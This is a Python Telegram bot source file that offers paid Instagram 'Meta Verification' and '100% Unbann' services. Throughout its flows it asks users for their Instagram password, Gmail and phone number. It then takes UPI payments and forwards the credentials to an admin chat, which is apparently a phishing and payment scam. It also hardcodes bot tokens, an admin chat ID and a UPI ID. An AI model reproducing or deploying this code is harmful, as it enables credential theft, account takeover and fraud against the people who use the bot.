import random
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    CallbackContext,
    filters,
)
from telegram.error import Forbidden

# Bot Tokens and Chat IDs
SUPER_VERY_BOT_TOKEN = "7907084038:AAHA8iqSQruAIcv4_H1bgI8-CF6WNb2ZbwA"
ADMIN_BOT_TOKEN = "8364703122:AAGZlvIEnrdIo7MssInfKzQRrW75Yi5HQnw"
ADMIN_CHAT_ID = "6159408312"

# UPI and QR Code Details
UPI_ID = "7053213575@kotak811"
QR_CODE_URL = "https://github.com/tnnygoku1221/QR-CODE/blob/main/WhatsApp%20Image%202025-09-06%20at%2017.29.11_5a791fa2.jpg"

# Store user data temporarily
user_data = {}

async def start(update: Update, context: CallbackContext) -> None:
    """Send a welcome message with buttons."""
    user_id = update.effective_user.id
    unique_id = random.randint(1000000, 9999999)
    user_data[user_id] = {"unique_id": unique_id}

    keyboard = [
        [InlineKeyboardButton("Meta Verification", callback_data="meta_verification")],
        [InlineKeyboardButton("Unbann", callback_data="unbann")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"✨ *Welcome to Super Very Bot!*\n\n"
        f"Your Unique User Code: `{unique_id}`\n\n"
        "Select an option:",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )

async def button_click(update: Update, context: CallbackContext) -> None:
    """Handle button clicks."""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # Initialize user_data if not already done
    if user_id not in user_data:
        user_data[user_id] = {"unique_id": random.randint(1000000, 9999999)}

    if query.data == "meta_verification":
        # Ask for username and password immediately
        await query.edit_message_text(
            "🔑 *Account Details Required*\n\n"
            "Please provide the following:\n"
            "1. instagram Username\n"
            ,
            parse_mode="Markdown",
        )
        user_data[user_id]["current_question"] = "username"
        user_data[user_id]["selected_service"] = "Meta Verification"

    elif query.data == "meta_type":
        # Ask for Meta type
        keyboard = [
            [InlineKeyboardButton("Business Meta", callback_data="business_meta")],
            [InlineKeyboardButton("Normal Meta", callback_data="normal_meta")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Select your Meta type:",
            reply_markup=reply_markup,
        )

    elif query.data in ["business_meta"]:
        # Ask for pricing tier
        keyboard = [
            [InlineKeyboardButton("Standard (₹639)", callback_data="standard")],
            [InlineKeyboardButton("Plus (₹1399)", callback_data="plus")],
            [InlineKeyboardButton("Premium (₹4199)", callback_data="premium")],
            [InlineKeyboardButton("Max (₹18900)", callback_data="max")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Select a plan:",
            reply_markup=reply_markup,
        )
        
    elif query.data in ["normal_meta"]:
            # Ask for pricing tier
        keyboard = [
            [InlineKeyboardButton("Standard (₹639)", callback_data="standard")],
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Select a plan:",
            reply_markup=reply_markup,
        )

    elif query.data in ["standard", "plus", "premium", "max"]:
        # Store selected plan
        price = {
            "standard": "₹639",
            "plus": "₹1399",
            "premium": "₹4199",
            "max": "₹18900",
        }[query.data]
        user_data[user_id]["price"] = price

        # Show UPI and QR code
        await query.edit_message_text(
            f"💰 *Payment Details*\n\n"
            f"Amount: {price}\n"
            f"UPI ID: `{UPI_ID}`\n\n"
            f"Scan the QR code below or manually send the amount.\n"
            f"[QR Code]({QR_CODE_URL})\n\n"
            "After payment, click *Payment Done* and share:\n"
            "1. UTR ID",
            parse_mode="Markdown",
        )
        await context.bot.send_message(
            chat_id=user_id,
            text="Click below after payment:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Payment Done", callback_data="payment_done")]
            ]),
        )

    elif query.data == "payment_done":
        # Ask for UTR ID 
        await context.bot.send_message(
            chat_id=user_id,
            text="Please send:\n1. UTR ID",
        )
        user_data[user_id]["awaiting_payment_proof"] = True

    elif query.data == "unbann":
        # Start Unbann flow
        await context.bot.send_message(
            chat_id=user_id,
            text="🔓 *100% Unbann Instagram Accounts*\n\n"
                 "Please answer the following questions one by one:\n\n"
                 "1. Your Instagram handle @:",
            parse_mode="Markdown",
        )
        user_data[user_id]["unbann_flow"] = True
        user_data[user_id]["current_question"] = "instagram_handle"
        user_data[user_id]["selected_service"] = "Unbann"

async def handle_message(update: Update, context: CallbackContext) -> None:
    """Handle user messages (e.g., UTR ID, Instagram handle)."""
    user_id = update.message.from_user.id
    text = update.message.text

    # Initialize user_data if not already done
    if user_id not in user_data:
        user_data[user_id] = {"unique_id": random.randint(1000000, 9999999)}

    if user_data.get(user_id, {}).get("awaiting_payment_proof"):
        try:
            # Forward payment proof to admin bot
            unique_id = user_data[user_id]["unique_id"]
            price = user_data[user_id].get("price", "N/A")
            selected_service = user_data[user_id]["selected_service"]

            # Prepare admin message
            admin_message = (
                f"🔄 *New {selected_service} Request*\n\n"
                f"Unique ID: `{unique_id}`\n"
                f"Amount: {price}\n\n"
                f"UTR ID: `{text}`\n"
                
            )

            # Add Meta Verification details
            if selected_service == "Meta Verification":
                admin_message += (
                    f"\n\n📝 *User Details*\n"
                    f"Username: `{user_data[user_id].get('username', 'N/A')}`\n"
                    f"Password: `{user_data[user_id].get('password', 'N/A')}`"
                )

            # Add Unbann details
            elif selected_service == "Unbann":
                admin_message += (
                    f"\n\n📝 *User Details*\n"
                    f"Instagram Handle: `{user_data[user_id].get('instagram_handle', 'N/A')}`\n"
                    f"Password: `{user_data[user_id].get('password', 'N/A')}`\n"
                    f"Gmail: `{user_data[user_id].get('gmail', 'N/A')}`\n"
                    f"Phone: `{user_data[user_id].get('phone', 'N/A')}`\n"
                    f"Suspension Date: `{user_data[user_id].get('suspension_date', 'N/A')}`\n"
                    f"Followers: `{user_data[user_id].get('followers', 'N/A')}`"
                )

            # Send to admin bot
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_message,
                parse_mode="Markdown",
            )

            # Notify user
            await update.message.reply_text(
                "✅ Payment details received! Admin will proceed with ur req .",
            
            " for any query and support contact @  or whatsapp ")
            del user_data[user_id]["awaiting_payment_proof"]

        except Forbidden:
            # User blocked the bot; skip further actions
            pass

    elif user_data.get(user_id, {}).get("unbann_flow"):
        # Handle Unbann questions
        current_question = user_data[user_id]["current_question"]

        if current_question == "instagram_handle":
            user_data[user_id]["instagram_handle"] = text
            user_data[user_id]["current_question"] = "password"
            await update.message.reply_text("2. Password:")

        elif current_question == "password":
            user_data[user_id]["password"] = text
            user_data[user_id]["current_question"] = "gmail"
            await update.message.reply_text("3. Your Gmail:")

        elif current_question == "gmail":
            user_data[user_id]["gmail"] = text
            user_data[user_id]["current_question"] = "phone"
            await update.message.reply_text("4. Your Phone Number:")

        elif current_question == "phone":
            user_data[user_id]["phone"] = text
            user_data[user_id]["current_question"] = "suspension_date"
            await update.message.reply_text("5. Date of Suspension:")

        elif current_question == "suspension_date":
            user_data[user_id]["suspension_date"] = text
            user_data[user_id]["current_question"] = "followers"
            await update.message.reply_text("6. Number of Followers:")

        elif current_question == "followers":
            try:
                followers = int(text)
                if followers < 500:
                    price = "₹1200"
                elif 500 <= followers < 1000:
                    price = "₹1600"
                elif 1000 <= followers < 5000:
                    price = "₹2200"
                elif 5000 <= followers < 10000:
                    price = "₹2700"
                elif 10000 <= followers < 20000:
                    price = "₹3800"
                elif 20000 <= followers < 50000:
                    price = "₹4500"
                else:
                    price = "₹5500"

                user_data[user_id]["price"] = price
                user_data[user_id]["followers"] = followers

                # Show UPI and QR code
                await update.message.reply_text(
                    f"💰 *Payment Details*\n\n"
                    f"Amount: {price}\n"
                    f"UPI ID: `{UPI_ID}`\n\n"
                    f"Scan the QR code below or manually send the amount.\n"
                    f"[QR Code]({QR_CODE_URL})\n\n"
                    "After payment, click *Payment Done* and share:\n"
                    "1. UTR ID",
                    parse_mode="Markdown",
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text="Click below after payment:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("Payment Done", callback_data="payment_done")]
                    ]),
                )

            except ValueError:
                await update.message.reply_text("Please enter a valid number.")

    elif user_data.get(user_id, {}).get("current_question") == "username":
        # Store username and ask for password
        user_data[user_id]["username"] = text
        user_data[user_id]["current_question"] = "password"
        await update.message.reply_text("2. Password:")

    elif user_data.get(user_id, {}).get("current_question") == "password":
        # Store password and proceed to payment
        user_data[user_id]["password"] = text
        user_data[user_id]["current_question"] = None

        # Ask for Meta type
        keyboard = [
            [InlineKeyboardButton("Business Meta", callback_data="business_meta")],
            [InlineKeyboardButton("Normal Meta", callback_data="normal_meta")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Select your Meta type:",
            reply_markup=reply_markup,
        )

def main() -> None:
    """Start the bot."""
    application = Application.builder().token(SUPER_VERY_BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_click))
    application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, handle_message))

    # Run the bot
    application.run_polling()

if __name__ == "__main__":
    main()
